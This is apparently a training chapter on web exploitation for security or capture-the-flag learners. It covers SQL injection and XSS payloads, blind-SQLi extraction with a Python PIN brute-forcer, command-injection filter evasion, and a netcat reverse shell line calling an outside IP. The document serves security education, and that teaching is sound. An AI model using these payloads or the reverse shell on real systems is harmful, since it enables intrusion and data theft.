# Chapter 3: Web Exploitation

## Core Concepts & Definitions
**Web Exploitation** involves finding and leveraging vulnerabilities in web applications to access unauthorized data or functionality.

**Key Terminology:**
*   **Client-Side:** Code running in the browser (HTML, CSS, JavaScript).
*   **Server-Side:** Code running on the server (PHP, Python, SQL).
*   **Request/Response:** The conversation between Client and Server.
*   **Injection:** Inserting malicious data that the system interprets as code.

---

## Level 1: Fundamentals
**Goal:** Understand how websites work and see what others miss.

### 1.1 HTML Source & DevTools
The browser tells you everything.
*   **View Source:** Right-click -> View Page Source. Shows the raw HTML.
    *   *Look for:* Comments `<!-- TODO: Fix login -->`, hidden inputs.
*   **Inspect Element:** Shows the live DOM (Document Object Model).
    *   *Usage:* Changing `type="password"` to `type="text"` to see your typing.

### 1.2 The URL Structure
`http://example.com/search?q=apple&cat=fruit`
*   **Protocol:** `http`
*   **Domain:** `example.com`
*   **Path:** `/search`
*   **Parameters:** `q=apple` and `cat=fruit`. **This is where you attack.**

### Practice 1.1: The Inspector
**Scenario:** A login button is disabled.
1.  Right-click the button -> "Inspect".
2.  Find the HTML: `<button disabled>Login</button>`.
3.  Double-click "disabled" and delete it.
4.  Click the button.

**Challenge Question 1:** What HTTP header identifies your browser and OS to the server? (Commonly `Mozilla/5.0...`)

---

## Level 2: Intermediate
**Goal:** Perform manual injection attacks (OWASP Top 10).

### 2.1 SQL Injection (SQLi) - Union Based
Code: `SELECT * FROM users WHERE name = '$input';`
*   **The Attack:** Input `' OR 1=1 --`
*   **The Result:** `SELECT * FROM users WHERE name = '' OR 1=1 --';`
*   **Deep Dive:** The `--` comments out the rest of the query. `1=1` is always true, so it dumps the whole table.

### 2.2 Cross-Site Scripting (Reflected XSS)
*   **Concept:** The server echoes your input back to the page without sanitizing it.
*   **Payload:** `<script>alert('XSS')</script>`
*   **Impact:** Stealing session cookies (`document.cookie`).

### Practice 2.1: The Admin Login
**Scenario:** A login form.
1.  Username: `admin' --`
2.  Password: (Empty)
3.  **Result:** You are logged in as admin because the query became `SELECT * FROM users WHERE user = 'admin' -- ...` AND the password check was commented out.

**Challenge Question 2:** In SQL injection, what specific command is used to confirm the number of columns in the current table? (`ORDER BY`)

---

## Level 3: Advanced
**Goal:** Automate attacks and exploit "Blind" vulnerabilities.

### 3.1 Blind SQL Injection
The server *doesn't* show errors or data. it only returns "Yes" (200 OK) or "No" (404/Empty).
*   **Boolean-Based:** Ask true/false questions.
    *   `id=1 AND (SELECT substring(pass,1,1) FROM users) = 'a'`
    *   If page loads -> First letter is 'a'.
    *   If page fails -> First letter is NOT 'a'.
*   **Automation:** This is too slow to do by hand. Write a Python script!

### 3.2 Command Injection (RCE)
Exploiting `system()` calls.
*   **Filter Evasion:**
    *   Space blocked? Use `${IFS}` (Internal Field Separator).
    *   `cat` blocked? Use `/bin/c??`.
*   **Reverse Shell:** `nc -e /bin/sh 10.10.10.5 4444`.

### Practice 3.1: Python for Blind SQLi
**Task:** Write a pseudo-script logic for extracting a 4-digit PIN.
```python
import requests
pin = ""
for i in range(4):
    for digit in "0123456789":
        # Payload: Is the i-th character equal to digit?
        r = requests.get(f"http://target.com?id=1 AND substring(pin,{i+1},1)='{digit}'")
        if "User Found" in r.text:
            pin += digit
            break
print(pin)
```

**Challenge Question 3:** What tool in Burp Suite allows you to forcefully send thousands of slightly different requests to brute-force a login? (Intruder).
